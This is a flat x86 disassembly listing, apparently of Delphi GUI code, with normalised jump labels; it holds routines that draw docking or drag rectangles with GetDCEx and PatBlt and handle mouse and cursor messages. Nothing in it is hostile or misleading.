call sub_448b8c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_448814
mov eax [ esi + 0x64 ]
call sub_4487d8
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4032e8
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_44a338
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4032e8
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44835c
mov edx eax
mov eax edi
call sub_448800
mov eax edi
call sub_448660
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_44a360
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_448b8c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44a360
mov edx [ eax + 0x14 ]
mov eax esi
call sub_448b8c
mov eax [ ebx + 0x14 ]
call sub_4032e8
mov eax edi
call sub_4032e8
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_449dcc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_444fc8
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407f60
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_448800
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_444f34
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_448800
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44a1e8
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44a360
xor edx edx
mov eax edi
call sub_448b8c
sub_449ea8
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4487d8
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402b18
mov edx eax
mov eax ebx
call sub_448800
sub_449ee4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_449f4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449f56
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_449f5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44a00b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_448568
mov eax [ ebp - 0x8 ]
call sub_449ee4
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_449f5c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a012
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_449f5c
pop ecx
sub_44a018
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a151
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a100
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_444f34
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a107
mov eax [ ebp - 0x10 ]
call sub_4032e8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_449ee4
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_444f48
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44a107
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_449f5c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a158
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_44a160
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4488b0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4488d8
call sub_44a160
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4488b0
call sub_44a160
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_4482e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_4487d8
mov edx eax
mov eax ebx
call sub_448800
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_448800
jmp r-xdata
sub_44a1e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_44a160
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44a22c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4487d8
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_448800
sub_44a25c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4464d0
mov edx eax
mov eax [ rw-data ]
call sub_44adbc
mov eax [ ebx + 0x14 ]
call sub_4464d0
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44a370
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44a2bc
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44adbc
mov eax ebx
call sub_44a370
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_448800
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_448800
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44a1e8
push ebx
push sub_44a360
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_448b8c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_44a338
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_444f34
test eax eax
jle r-xdata
push ebx
push sub_44a360
xor edx edx
mov eax ebx
call sub_448b8c
sub_44a370
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_4483a4
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_4483a4
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_448410
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_448410
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_420c6c
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44a45c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44a45c
pop ecx
mov eax ebx
call sub_4487d8
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4487d8
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44a45c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4487d8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_427adc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44a4ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4487d8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44835c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_4487d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44a45c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a53c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43f650
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f650
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_44a5b8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_448268
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_448314
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_4488bc
test eax eax
je r-xdata
mov eax esi
call sub_4482e0
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44a360
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_448b8c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4488bc
mov edx [ ebx + 0x20 ]
call sub_448814
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_44a5b8
pop ecx
sub_44a638
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_4482c4
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_4482c4
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_4488bc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_44a638
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44a360
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_448b8c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_4484c0
mov eax edi
call sub_4488b0
test eax eax
je r-xdata
mov eax edi
call sub_4488bc
mov esi eax
mov eax esi
call sub_4487d8
push eax
mov eax esi
call sub_448314
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_4488b0
call sub_4487d8
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_4487d8
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_448800
mov eax esi
call sub_4487d8
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_448800
mov eax edi
call sub_4488bc
call sub_448850
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_448314
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_448800
mov eax edi
call sub_4488b0
call sub_448850
mov bl 0x1
jmp r-xdata
sub_44a770
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448b24
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416114
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_449318
test eax eax
je r-xdata
push ebp
call sub_44a5b8
pop ecx
push ebp
call sub_44a638
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44a53c
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44a7f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_4483a4
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_4483a4
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44a4ec
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44a4ec
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44a888
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ac60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cec
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_449318
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a2bc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cec
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449318
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43f7f4
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac67
lea eax [ ebp - 0x48 ]
call sub_404038
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4464d0
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43e510
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4409b0
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404038
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44a770
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_444fc8
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a370
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cec
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44a7f8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44a370
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cec
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449318
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43fbd0
jmp r-xdata
mov eax edi
call sub_45c210
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449318
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f650
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43fcb0
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_40408c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a25c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d910
push eax
call SetCursor
